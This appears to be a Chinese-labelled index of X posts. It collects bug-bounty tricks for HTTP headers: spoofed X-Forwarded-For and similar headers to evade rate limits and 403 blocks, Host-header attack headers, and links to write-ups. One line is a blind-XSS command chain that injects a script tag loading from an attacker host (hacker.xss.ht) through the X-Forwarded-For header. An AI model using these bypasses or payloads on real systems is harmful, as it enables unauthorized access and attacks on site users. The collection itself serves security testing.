# X 语料 · 回收的header清单

来源：X 公开贴子，含可直接套用的骨架（多条 dork 语法 / 多个请求头 / 多步 recon / 多工具链）。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：本类无专属篇，按 [检测入口](../vuln-detection.md) 选择 · 索引与计数：[x-corpus.md](x-corpus.md) · 本文 54 行

- Rate limit bypass:
  Add header/s with request
  X-Originating-IP: IP
  X-Forwarded-For: IP
  X-Remote-IP: IP
  X-Remote-Addr: IP
  X-Client-IP: IP
  X-Host: IP
  X-Forwared-Host: IP
  If bypass successful, & after a while blocking request again. Increment the last octate
- Headers usable in Host header attacks:
  X-Original-Url:
  X-Forwarded-Server:
  X-Host:
  X-Forwarded-Host:
  Add one of these headers to any request and observe the response.
- Bypass a Rate-Limit of 30 seconds after multiple requests by adding these headers.
  X-Forwarded-Host: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-True-IP: 127.0.0.1
- Blind XSS In X-Forwarded-For Header
  subfinder -d http://target.com | gau | bxss -payload '"><script src=http://hacker.xss.ht></script>' -header "X-Forwarded-For"
- 403 Forbidden Bypass tips
  - Adding headers to requests module.
  Content-Length: 0
  X-rewrite-url
  X-Original-URL
  X-Custom-IP-Authorization
  X-Forwarded-For
  - Change requested method
  GET → POST, GET → TRACE, GET → PUT, GET → OPTIONS
- Bypass Rate-Limit via X-Forwarded-For
  https://medium.com/@null.x.b1ty/bypass-rate-limit-via-x-forwarded-for-ea26c7a25a90
- Reflected XSS via X-Forwarded-For Header on https://api.target.com/ip
  https://medium.com/@ugs20b126_cic.rajesh/reflected-xss-via-x-forwarded-for-header-on-https-api-target-com-ip-96642a4a49ed
- Exploiting Web Cache Poisoning with X-Host Header Using Param Miner
  https://infosecwriteups.com/exploiting-web-cache-poisoning-with-x-host-header-using-param-miner-f1b7b06bf5b8
- How I Discovered an Open Redirect Using X-Forwarded-Host
  https://levi4.medium.com/how-i-discovered-an-open-redirect-using-x-forwarded-host-a-bug-bounty-story-with-real-world-792d66eaffff
- Unauthorized Access to Internal Nginx Status Page via X-Forwarded-For Header
  https://medium.com/@bytewreaker/unauthorized-access-to-internal-nginx-status-page-via-x-forwarded-for-header-31de9e8b4e28
- Modern web apps trust headers like:
  X-Forwarded-Host
  X-Original-URL
  X-Rewrite-URL
  You can influence routing, auth checks, or cache keys.
  Bugs often live in trust boundaries, not code.
